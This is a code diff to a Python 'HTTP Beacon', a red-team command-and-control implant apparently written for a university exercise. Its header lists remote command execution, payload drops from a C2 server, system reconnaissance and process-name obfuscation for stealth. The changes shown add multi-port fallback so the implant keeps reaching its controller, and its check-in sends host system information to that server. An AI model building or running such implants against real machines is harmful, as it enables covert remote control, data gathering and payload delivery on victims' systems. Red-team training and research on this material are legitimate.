@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 HTTP Beacon - Enhanced Callback Tool for Red Team Operations
-Author: Arshia Aggarwal aa9779@rit.edu
+Author: [Your Name] <your.email@rit.edu>
 
 Enhanced features:
 - Command execution with output capture
@@ -9,6 +9,7 @@ Enhanced features:
 - File download from C2 server (drop payloads on target)
 - System information gathering
 - Process name obfuscation for stealth
+- Multi-port fallback for resilience
 """
 
 import requests
@@ -25,16 +26,42 @@ import platform
 class Beacon:
     def __init__(self, c2_url, beacon_id, check_in_interval=30):
         """
-        Initialize the beacon with fallback ports
+        Initialize the beacon with multi-port fallback support
+        
+        Args:
+            c2_url: URL of C2 server (e.g., 'http://192.168.1.100:8080' or 'http://192.168.1.100')
+            beacon_id: Unique identifier for this beacon
+            check_in_interval: Base seconds between check-ins
         """
-        self.c2_base_url = c2_url.rsplit(':', 1)[0]  # Extract base URL without port
+        # Extract base URL (remove port if present)
+        if ':' in c2_url.split('//')[-1]:
+            # URL has port, extract base
+            self.c2_base_url = c2_url.rsplit(':', 1)[0]
+            initial_port = int(c2_url.rsplit(':', 1)[1])
+        else:
+            # URL has no port, use as-is
+            self.c2_base_url = c2_url
+            initial_port = 8080
+        
         self.beacon_id = beacon_id
         self.check_in_interval = check_in_interval
         
         # Fallback ports - beacon tries these in order
-        self.fallback_ports = [8080, 8000, 8443, 9090, 443, 80]
+        self.fallback_ports = [initial_port, 8080, 8000, 8443, 9090, 443, 80]
+        # Remove duplicates while preserving order
+        seen = set()
+        self.fallback_ports = [p for p in self.fallback_ports if not (p in seen or seen.add(p))]
+        
         self.current_port = self.fallback_ports[0]
         self.c2_url = f"{self.c2_base_url}:{self.current_port}"
+        
+    def try_next_port(self):
+        """Switch to next fallback port"""
+        current_index = self.fallback_ports.index(self.current_port)
+        next_index = (current_index + 1) % len(self.fallback_ports)
+        self.current_port = self.fallback_ports[next_index]
+        self.c2_url = f"{self.c2_base_url}:{self.current_port}"
+        print(f"[*] Switching to fallback port: {self.current_port}")
         
     def get_system_info(self):
         """
@@ -165,17 +192,9 @@ class Beacon:
         except Exception as e:
             return f"[ERROR] Download failed: {str(e)}"
     
-    def try_next_port(self):
-        """Switch to next fallback port"""
-        current_index = self.fallback_ports.index(self.current_port)
-        next_index = (current_index + 1) % len(self.fallback_ports)
-        self.current_port = self.fallback_ports[next_index]
-        self.c2_url = f"{self.c2_base_url}:{self.current_port}"
-        print(f"[*] Switching to fallback port: {self.current_port}")
-
     def check_in(self):
         """
-        Check in with C2 server to see if there are commands
+        Check in with C2 server - tries fallback ports on failure
         
         Returns:
             Dictionary with command type and data, or None
@@ -185,6 +204,8 @@ class Beacon:
         for attempt in range(max_attempts):
             try:
                 url = f"{self.c2_url}/checkin/{self.beacon_id}"
+                
+                # Include system info in check-in
                 sys_info = self.get_system_info()
                 response = requests.post(url, json=sys_info, timeout=10)
                 
@@ -281,6 +302,7 @@ class Beacon:
         """
         print(f"[*] Beacon {self.beacon_id} starting...")
         print(f"[*] C2 Server: {self.c2_url}")
+        print(f"[*] Fallback ports: {self.fallback_ports}")
         print(f"[*] Check-in interval: ~{self.check_in_interval}s (with jitter)")
         print(f"[*] Starting beacon loop...\n")
         
